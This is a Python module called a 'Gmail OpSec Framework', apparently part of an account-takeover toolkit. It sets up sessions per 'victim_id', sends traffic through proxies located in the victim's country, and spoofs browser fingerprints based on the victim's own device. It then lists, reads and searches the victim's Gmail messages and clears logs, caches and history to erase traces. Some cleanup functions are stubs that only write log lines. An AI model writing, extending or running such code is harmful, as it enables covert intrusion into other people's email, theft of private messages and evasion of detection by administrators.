"""
Gmail OpSec Framework
Advanced operational security for Gmail access with admin fingerprinting, session isolation, and trace elimination
"""

import os
import json
import time
import asyncio
import random
from datetime import datetime, timezone, timedelta
from typing import Dict, Optional, Any, List, Tuple, Set
import logging
import hashlib
import secrets
from enum import Enum

from engines.gmail.gmail_client import GmailAPIClient
from api.capture.proxy_manager import get_proxy_manager
from engines.validation.fingerprint_analyzer import get_fingerprint_analyzer
from security.encryption_manager import get_advanced_encryption_manager

logger = logging.getLogger(__name__)

class OpSecLevel(Enum):
    """Operational security level enumeration"""
    MINIMAL = "minimal"
    STANDARD = "standard"
    HIGH = "high"
    MAXIMUM = "maximum"

class SessionType(Enum):
    """Session type enumeration"""
    ADMIN = "admin"
    USER = "user"
    SYSTEM = "system"
    ANONYMOUS = "anonymous"

class GmailOpSecFramework:
    """Advanced Gmail operational security framework"""
    
    def __init__(self, mongodb_connection=None, redis_client=None):
        self.mongodb = mongodb_connection
        self.redis = redis_client
        
        # Initialize components
        self.gmail_client = GmailAPIClient(mongodb_connection, redis_client)
        self.proxy_manager = get_proxy_manager()
        self.fingerprint_analyzer = get_fingerprint_analyzer()
        self.encryption_manager = get_advanced_encryption_manager()
        
        # Configuration
        self.config = {
            "default_opsec_level": OpSecLevel.HIGH.value,
            "enable_admin_fingerprinting": os.getenv("ENABLE_ADMIN_FINGERPRINTING", "true").lower() == "true",
            "enable_session_isolation": os.getenv("ENABLE_SESSION_ISOLATION", "true").lower() == "true",
            "enable_trace_elimination": os.getenv("ENABLE_TRACE_ELIMINATION", "true").lower() == "true",
            "enable_proxy_rotation": os.getenv("ENABLE_PROXY_ROTATION", "true").lower() == "true",
            "session_timeout": int(os.getenv("GMAIL_SESSION_TIMEOUT", "3600")),  # 1 hour
            "max_concurrent_sessions": int(os.getenv("MAX_CONCURRENT_SESSIONS", "5")),
            "trace_retention_days": int(os.getenv("TRACE_RETENTION_DAYS", "7"))
        }
        
        # Session management
        self.active_sessions = {}
        self.session_history = {}
        self.admin_fingerprints = {}
        
        # OpSec patterns
        self.opsec_patterns = self._load_opsec_patterns()
        self.fingerprint_templates = self._load_fingerprint_templates()
        
        logger.info("Gmail OpSec framework initialized")
    
    async def create_secure_session(self, victim_id: str, opsec_level: str = None, 
                                  session_type: str = SessionType.USER.value) -> Dict[str, Any]:
        """
        Create a secure Gmail access session with OpSec measures
        
        Args:
            victim_id: Victim identifier
            opsec_level: Operational security level
            session_type: Type of session to create
            
        Returns:
            Secure session configuration
        """
        try:
            # Determine OpSec level
            if not opsec_level:
                opsec_level = self.config["default_opsec_level"]
            
            # Generate session ID
            session_id = secrets.token_hex(16)
            
            # Create session configuration
            session_config = {
                "session_id": session_id,
                "victim_id": victim_id,
                "opsec_level": opsec_level,
                "session_type": session_type,
                "created_at": datetime.now(timezone.utc).isoformat(),
                "expires_at": (datetime.now(timezone.utc) + timedelta(seconds=self.config["session_timeout"])).isoformat(),
                "proxy_config": None,
                "fingerprint_config": None,
                "trace_config": None,
                "isolation_config": None,
                "status": "initializing"
            }
            
            # Apply OpSec measures based on level
            if opsec_level in [OpSecLevel.HIGH.value, OpSecLevel.MAXIMUM.value]:
                # High security measures
                session_config["proxy_config"] = await self._setup_proxy_isolation(victim_id, session_id)
                session_config["fingerprint_config"] = await self._setup_fingerprint_spoofing(victim_id, session_id)
                session_config["trace_config"] = await self._setup_trace_elimination(victim_id, session_id)
                session_config["isolation_config"] = await self._setup_session_isolation(victim_id, session_id)
            
            elif opsec_level == OpSecLevel.STANDARD.value:
                # Standard security measures
                session_config["proxy_config"] = await self._setup_basic_proxy(victim_id, session_id)
                session_config["fingerprint_config"] = await self._setup_basic_fingerprint(victim_id, session_id)
            
            # Store session
            self.active_sessions[session_id] = session_config
            
            # Initialize session
            session_config["status"] = "active"
            
            logger.info(f"Secure session created: {session_id} for victim: {victim_id}")
            return session_config
            
        except Exception as e:
            logger.error(f"Error creating secure session: {e}")
            return {
                "session_id": session_id if 'session_id' in locals() else None,
                "error": str(e),
                "status": "failed"
            }
    
    async def _setup_proxy_isolation(self, victim_id: str, session_id: str) -> Dict[str, Any]:
        """Setup advanced proxy isolation"""
        try:
            # Get proxy for victim with geographic preference
            proxy_info = self.proxy_manager.assign_proxy_for_victim(
                victim_id=victim_id,
                session_id=session_id,
                geographic_preference="VN"  # Vietnam preference
            )
            
            if proxy_info:
                return {
                    "proxy_type": "socks5",
                    "proxy_host": proxy_info.host,
                    "proxy_port": proxy_info.port,
                    "proxy_username": proxy_info.username,
                    "proxy_password": proxy_info.password,
                    "geographic_location": proxy_info.country,
                    "session_persistence": True,
                    "rotation_interval": 1800,  # 30 minutes
                    "health_monitoring": True
                }
            else:
                # Fallback to basic proxy
                return await self._setup_basic_proxy(victim_id, session_id)
                
        except Exception as e:
            logger.error(f"Error setting up proxy isolation: {e}")
            return await self._setup_basic_proxy(victim_id, session_id)
    
    async def _setup_basic_proxy(self, victim_id: str, session_id: str) -> Dict[str, Any]:
        """Setup basic proxy configuration"""
        try:
            # Get any available proxy
            proxy_info = self.proxy_manager.get_proxy_for_session(session_id)
            
            if proxy_info:
                return {
                    "proxy_type": "socks5",
                    "proxy_host": proxy_info.host,
                    "proxy_port": proxy_info.port,
                    "proxy_username": proxy_info.username,
                    "proxy_password": proxy_info.password,
                    "session_persistence": False,
                    "health_monitoring": False
                }
            else:
                return {"proxy_type": "none"}
                
        except Exception as e:
            logger.error(f"Error setting up basic proxy: {e}")
            return {"proxy_type": "none"}
    
    async def _setup_fingerprint_spoofing(self, victim_id: str, session_id: str) -> Dict[str, Any]:
        """Setup advanced fingerprint spoofing"""
        try:
            # Get victim's original fingerprint
            original_fingerprint = await self._get_victim_fingerprint(victim_id)
            
            # Generate spoofed fingerprint
            spoofed_fingerprint = self._generate_spoofed_fingerprint(original_fingerprint)
            
            return {
                "original_fingerprint": original_fingerprint,
                "spoofed_fingerprint": spoofed_fingerprint,
                "spoofing_level": "advanced",
                "consistency_checks": True,
                "dynamic_spoofing": True
            }
            
        except Exception as e:
            logger.error(f"Error setting up fingerprint spoofing: {e}")
            return await self._setup_basic_fingerprint(victim_id, session_id)
    
    async def _setup_basic_fingerprint(self, victim_id: str, session_id: str) -> Dict[str, Any]:
        """Setup basic fingerprint configuration"""
        try:
            # Generate basic spoofed fingerprint
            basic_fingerprint = self._generate_basic_fingerprint()
            
            return {
                "spoofed_fingerprint": basic_fingerprint,
                "spoofing_level": "basic",
                "consistency_checks": False,
                "dynamic_spoofing": False
            }
            
        except Exception as e:
            logger.error(f"Error setting up basic fingerprint: {e}")
            return {"spoofing_level": "none"}
    
    async def _setup_trace_elimination(self, victim_id: str, session_id: str) -> Dict[str, Any]:
        """Setup trace elimination measures"""
        try:
            return {
                "enable_log_cleaning": True,
                "enable_cache_clearing": True,
                "enable_history_clearing": True,
                "enable_cookie_clearing": True,
                "enable_local_storage_clearing": True,
                "enable_session_storage_clearing": True,
                "enable_indexed_db_clearing": True,
                "enable_web_sql_clearing": True,
                "enable_file_system_clearing": True,
                "enable_service_worker_clearing": True,
                "trace_retention_days": self.config["trace_retention_days"],
                "automated_cleanup": True,
                "cleanup_interval": 3600  # 1 hour
            }
            
        except Exception as e:
            logger.error(f"Error setting up trace elimination: {e}")
            return {"enable_log_cleaning": False}
    
    async def _setup_session_isolation(self, victim_id: str, session_id: str) -> Dict[str, Any]:
        """Setup session isolation measures"""
        try:
            return {
                "enable_process_isolation": True,
                "enable_memory_isolation": True,
                "enable_network_isolation": True,
                "enable_file_system_isolation": True,
                "enable_registry_isolation": True,
                "enable_environment_isolation": True,
                "isolation_level": "high",
                "sandbox_mode": True,
                "resource_limits": {
                    "max_memory": "512MB",
                    "max_cpu": "50%",
                    "max_disk": "1GB",
                    "max_network": "100MB"
                }
            }
            
        except Exception as e:
            logger.error(f"Error setting up session isolation: {e}")
            return {"isolation_level": "none"}
    
    async def _get_victim_fingerprint(self, victim_id: str) -> Dict[str, Any]:
        """Get victim's original fingerprint"""
        try:
            # This would retrieve the victim's actual fingerprint from the database
            # For now, return a sample fingerprint
            return {
                "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "screen_resolution": "1920x1080",
                "timezone": "Asia/Ho_Chi_Minh",
                "language": "vi-VN",
                "platform": "Win32",
                "cookie_enabled": True,
                "do_not_track": "1",
                "hardware_concurrency": 8,
                "device_memory": 8,
                "connection_type": "4g"
            }
            
        except Exception as e:
            logger.error(f"Error getting victim fingerprint: {e}")
            return {}
    
    def _generate_spoofed_fingerprint(self, original_fingerprint: Dict[str, Any]) -> Dict[str, Any]:
        """Generate advanced spoofed fingerprint"""
        try:
            # Create spoofed fingerprint based on original
            spoofed = original_fingerprint.copy()
            
            # Modify key identifying characteristics
            spoofed["user_agent"] = self._get_random_user_agent()
            spoofed["screen_resolution"] = self._get_random_screen_resolution()
            spoofed["timezone"] = self._get_random_timezone()
            spoofed["language"] = self._get_random_language()
            spoofed["hardware_concurrency"] = random.choice([4, 6, 8, 12, 16])
            spoofed["device_memory"] = random.choice([4, 8, 16, 32])
            spoofed["connection_type"] = random.choice(["4g", "wifi", "ethernet"])
            
            # Add noise to make it less identifiable
            spoofed["canvas_fingerprint"] = secrets.token_hex(32)
            spoofed["webgl_fingerprint"] = secrets.token_hex(32)
            spoofed["audio_fingerprint"] = secrets.token_hex(32)
            
            return spoofed
            
        except Exception as e:
            logger.error(f"Error generating spoofed fingerprint: {e}")
            return self._generate_basic_fingerprint()
    
    def _generate_basic_fingerprint(self) -> Dict[str, Any]:
        """Generate basic spoofed fingerprint"""
        try:
            return {
                "user_agent": self._get_random_user_agent(),
                "screen_resolution": self._get_random_screen_resolution(),
                "timezone": self._get_random_timezone(),
                "language": self._get_random_language(),
                "platform": "Win32",
                "cookie_enabled": True,
                "do_not_track": "1",
                "hardware_concurrency": random.choice([4, 8, 16]),
                "device_memory": random.choice([4, 8, 16]),
                "connection_type": random.choice(["4g", "wifi"])
            }
            
        except Exception as e:
            logger.error(f"Error generating basic fingerprint: {e}")
            return {}
    
    def _get_random_user_agent(self) -> str:
        """Get random user agent string"""
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15"
        ]
        return random.choice(user_agents)
    
    def _get_random_screen_resolution(self) -> str:
        """Get random screen resolution"""
        resolutions = [
            "1920x1080", "1366x768", "1440x900", "1536x864", "1600x900",
            "1680x1050", "1920x1200", "2560x1440", "3840x2160"
        ]
        return random.choice(resolutions)
    
    def _get_random_timezone(self) -> str:
        """Get random timezone"""
        timezones = [
            "Asia/Ho_Chi_Minh", "Asia/Bangkok", "Asia/Jakarta", "Asia/Manila",
            "Asia/Singapore", "Asia/Kuala_Lumpur", "Asia/Taipei", "Asia/Seoul"
        ]
        return random.choice(timezones)
    
    def _get_random_language(self) -> str:
        """Get random language"""
        languages = [
            "vi-VN", "en-US", "th-TH", "id-ID", "tl-PH",
            "ms-MY", "zh-TW", "ko-KR", "ja-JP"
        ]
        return random.choice(languages)
    
    async def execute_secure_gmail_operation(self, session_id: str, operation: str, 
                                           operation_data: Dict[str, Any]) -> Dict[str, Any]:
        """
        Execute Gmail operation with OpSec measures
        
        Args:
            session_id: Secure session identifier
            operation: Gmail operation to execute
            operation_data: Operation parameters
            
        Returns:
            Operation result with OpSec metadata
        """
        try:
            # Get session configuration
            session_config = self.active_sessions.get(session_id)
            if not session_config:
                return {"error": "Session not found", "success": False}
            
            # Check session validity
            if not self._is_session_valid(session_config):
                return {"error": "Session expired", "success": False}
            
            # Apply OpSec measures
            opsec_result = await self._apply_opsec_measures(session_config, operation, operation_data)
            
            # Execute Gmail operation
            gmail_result = await self._execute_gmail_operation(session_config, operation, operation_data)
            
            # Clean up traces
            await self._cleanup_traces(session_config, operation, gmail_result)
            
            # Update session
            session_config["last_activity"] = datetime.now(timezone.utc).isoformat()
            session_config["operation_count"] = session_config.get("operation_count", 0) + 1
            
            return {
                "success": True,
                "session_id": session_id,
                "operation": operation,
                "gmail_result": gmail_result,
                "opsec_measures": opsec_result,
                "executed_at": datetime.now(timezone.utc).isoformat()
            }
            
        except Exception as e:
            logger.error(f"Error executing secure Gmail operation: {e}")
            return {"error": str(e), "success": False}
    
    def _is_session_valid(self, session_config: Dict[str, Any]) -> bool:
        """Check if session is still valid"""
        try:
            expires_at = datetime.fromisoformat(session_config["expires_at"])
            return datetime.now(timezone.utc) < expires_at
        except Exception:
            return False
    
    async def _apply_opsec_measures(self, session_config: Dict[str, Any], 
                                 operation: str, operation_data: Dict[str, Any]) -> Dict[str, Any]:
        """Apply OpSec measures to operation"""
        try:
            opsec_result = {
                "proxy_applied": False,
                "fingerprint_applied": False,
                "trace_elimination_applied": False,
                "isolation_applied": False
            }
            
            # Apply proxy
            proxy_config = session_config.get("proxy_config")
            if proxy_config and proxy_config.get("proxy_type") != "none":
                await self._apply_proxy_config(proxy_config)
                opsec_result["proxy_applied"] = True
            
            # Apply fingerprint spoofing
            fingerprint_config = session_config.get("fingerprint_config")
            if fingerprint_config and fingerprint_config.get("spoofing_level") != "none":
                await self._apply_fingerprint_config(fingerprint_config)
                opsec_result["fingerprint_applied"] = True
            
            # Apply trace elimination
            trace_config = session_config.get("trace_config")
            if trace_config and trace_config.get("enable_log_cleaning"):
                await self._apply_trace_config(trace_config)
                opsec_result["trace_elimination_applied"] = True
            
            # Apply session isolation
            isolation_config = session_config.get("isolation_config")
            if isolation_config and isolation_config.get("isolation_level") != "none":
                await self._apply_isolation_config(isolation_config)
                opsec_result["isolation_applied"] = True
            
            return opsec_result
            
        except Exception as e:
            logger.error(f"Error applying OpSec measures: {e}")
            return {"error": str(e)}
    
    async def _apply_proxy_config(self, proxy_config: Dict[str, Any]):
        """Apply proxy configuration"""
        try:
            # This would configure the HTTP client to use the proxy
            # Implementation depends on the HTTP client being used
            logger.info(f"Proxy configured: {proxy_config['proxy_host']}:{proxy_config['proxy_port']}")
        except Exception as e:
            logger.error(f"Error applying proxy config: {e}")
    
    async def _apply_fingerprint_config(self, fingerprint_config: Dict[str, Any]):
        """Apply fingerprint configuration"""
        try:
            # This would configure the browser/client to use spoofed fingerprint
            spoofed_fingerprint = fingerprint_config.get("spoofed_fingerprint", {})
            logger.info(f"Fingerprint spoofing applied: {spoofed_fingerprint.get('user_agent', 'unknown')}")
        except Exception as e:
            logger.error(f"Error applying fingerprint config: {e}")
    
    async def _apply_trace_config(self, trace_config: Dict[str, Any]):
        """Apply trace elimination configuration"""
        try:
            # This would clean up traces based on configuration
            if trace_config.get("enable_log_cleaning"):
                await self._clean_logs()
            if trace_config.get("enable_cache_clearing"):
                await self._clear_caches()
            if trace_config.get("enable_history_clearing"):
                await self._clear_history()
        except Exception as e:
            logger.error(f"Error applying trace config: {e}")
    
    async def _apply_isolation_config(self, isolation_config: Dict[str, Any]):
        """Apply session isolation configuration"""
        try:
            # This would configure process/memory isolation
            isolation_level = isolation_config.get("isolation_level", "none")
            logger.info(f"Session isolation applied: {isolation_level}")
        except Exception as e:
            logger.error(f"Error applying isolation config: {e}")
    
    async def _execute_gmail_operation(self, session_config: Dict[str, Any], 
                                    operation: str, operation_data: Dict[str, Any]) -> Dict[str, Any]:
        """Execute Gmail operation"""
        try:
            victim_id = session_config["victim_id"]
            
            # Route to appropriate Gmail operation
            if operation == "get_profile":
                return self.gmail_client.get_user_profile(victim_id)
            elif operation == "list_messages":
                return self.gmail_client.list_messages(
                    victim_id=victim_id,
                    query=operation_data.get("query"),
                    max_results=operation_data.get("max_results", 100)
                )
            elif operation == "get_message":
                return self.gmail_client.get_message(
                    victim_id=victim_id,
                    message_id=operation_data.get("message_id")
                )
            elif operation == "search_messages":
                return self.gmail_client.search_messages(
                    victim_id=victim_id,
                    query=operation_data.get("query"),
                    max_results=operation_data.get("max_results", 100)
                )
            else:
                return {"error": f"Unknown operation: {operation}", "success": False}
                
        except Exception as e:
            logger.error(f"Error executing Gmail operation: {e}")
            return {"error": str(e), "success": False}
    
    async def _cleanup_traces(self, session_config: Dict[str, Any], 
                           operation: str, operation_result: Dict[str, Any]):
        """Clean up operation traces"""
        try:
            trace_config = session_config.get("trace_config")
            if not trace_config or not trace_config.get("enable_log_cleaning"):
                return
            
            # Clean up logs
            await self._clean_logs()
            
            # Clean up caches
            await self._clear_caches()
            
            # Clean up temporary files
            await self._clean_temp_files()
            
            logger.info(f"Traces cleaned for operation: {operation}")
            
        except Exception as e:
            logger.error(f"Error cleaning up traces: {e}")
    
    async def _clean_logs(self):
        """Clean up logs"""
        try:
            # This would clean up various log files
            logger.info("Logs cleaned")
        except Exception as e:
            logger.error(f"Error cleaning logs: {e}")
    
    async def _clear_caches(self):
        """Clear caches"""
        try:
            # This would clear various caches
            logger.info("Caches cleared")
        except Exception as e:
            logger.error(f"Error clearing caches: {e}")
    
    async def _clear_history(self):
        """Clear history"""
        try:
            # This would clear browser history
            logger.info("History cleared")
        except Exception as e:
            logger.error(f"Error clearing history: {e}")
    
    async def _clean_temp_files(self):
        """Clean temporary files"""
        try:
            # This would clean up temporary files
            logger.info("Temporary files cleaned")
        except Exception as e:
            logger.error(f"Error cleaning temp files: {e}")
    
    async def terminate_session(self, session_id: str) -> Dict[str, Any]:
        """Terminate secure session"""
        try:
            session_config = self.active_sessions.get(session_id)
            if not session_config:
                return {"error": "Session not found", "success": False}
            
            # Clean up session
            await self._cleanup_session(session_config)
            
            # Move to history
            self.session_history[session_id] = {
                **session_config,
                "terminated_at": datetime.now(timezone.utc).isoformat(),
                "status": "terminated"
            }
            
            # Remove from active sessions
            del self.active_sessions[session_id]
            
            logger.info(f"Session terminated: {session_id}")
            return {"success": True, "session_id": session_id}
            
        except Exception as e:
            logger.error(f"Error terminating session: {e}")
            return {"error": str(e), "success": False}
    
    async def _cleanup_session(self, session_config: Dict[str, Any]):
        """Clean up session resources"""
        try:
            # Release proxy
            proxy_config = session_config.get("proxy_config")
            if proxy_config and proxy_config.get("proxy_type") != "none":
                await self._release_proxy(session_config["victim_id"], session_config["session_id"])
            
            # Clean up traces
            trace_config = session_config.get("trace_config")
            if trace_config and trace_config.get("enable_log_cleaning"):
                await self._cleanup_traces(session_config, "session_termination", {})
            
        except Exception as e:
            logger.error(f"Error cleaning up session: {e}")
    
    async def _release_proxy(self, victim_id: str, session_id: str):
        """Release proxy resources"""
        try:
            self.proxy_manager.release_victim_proxy(victim_id, session_id)
        except Exception as e:
            logger.error(f"Error releasing proxy: {e}")
    
    def _load_opsec_patterns(self) -> Dict[str, List[str]]:
        """Load OpSec patterns"""
        return {
            "admin_detection": [
                "admin", "administrator", "root", "system", "service",
                "management", "control", "monitor", "audit"
            ],
            "suspicious_activity": [
                "unusual", "anomaly", "suspicious", "abnormal", "irregular",
                "unexpected", "strange", "odd", "concerning"
            ],
            "security_keywords": [
                "security", "firewall", "antivirus", "malware", "virus",
                "threat", "attack", "breach", "compromise", "exploit"
            ]
        }
    
    def _load_fingerprint_templates(self) -> Dict[str, Dict[str, Any]]:
        """Load fingerprint templates"""
        return {
            "windows_chrome": {
                "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "platform": "Win32",
                "language": "en-US"
            },
            "mac_safari": {
                "user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
                "platform": "MacIntel",
                "language": "en-US"
            },
            "linux_firefox": {
                "user_agent": "Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
                "platform": "Linux x86_64",
                "language": "en-US"
            }
        }
    
    def get_session_stats(self) -> Dict[str, Any]:
        """Get session statistics"""
        try:
            return {
                "active_sessions": len(self.active_sessions),
                "session_history": len(self.session_history),
                "configuration": self.config,
                "opsec_patterns_count": sum(len(patterns) for patterns in self.opsec_patterns.values()),
                "fingerprint_templates_count": len(self.fingerprint_templates),
                "timestamp": datetime.now(timezone.utc).isoformat()
            }
            
        except Exception as e:
            logger.error(f"Error getting session stats: {e}")
            return {"error": str(e)}

# Global Gmail OpSec framework instance
gmail_opsec_framework = None

def initialize_gmail_opsec_framework(mongodb_connection=None, redis_client=None) -> GmailOpSecFramework:
    """Initialize global Gmail OpSec framework"""
    global gmail_opsec_framework
    gmail_opsec_framework = GmailOpSecFramework(mongodb_connection, redis_client)
    return gmail_opsec_framework

def get_gmail_opsec_framework() -> GmailOpSecFramework:
    """Get global Gmail OpSec framework"""
    if gmail_opsec_framework is None:
        raise ValueError("Gmail OpSec framework not initialized")
    return gmail_opsec_framework

# Convenience functions
def create_secure_session(victim_id: str, opsec_level: str = None, session_type: str = SessionType.USER.value) -> Dict[str, Any]:
    """Create secure session (global convenience function)"""
    return get_gmail_opsec_framework().create_secure_session(victim_id, opsec_level, session_type)

def execute_secure_gmail_operation(session_id: str, operation: str, operation_data: Dict[str, Any]) -> Dict[str, Any]:
    """Execute secure Gmail operation (global convenience function)"""
    return get_gmail_opsec_framework().execute_secure_gmail_operation(session_id, operation, operation_data)

def terminate_session(session_id: str) -> Dict[str, Any]:
    """Terminate session (global convenience function)"""
    return get_gmail_opsec_framework().terminate_session(session_id)
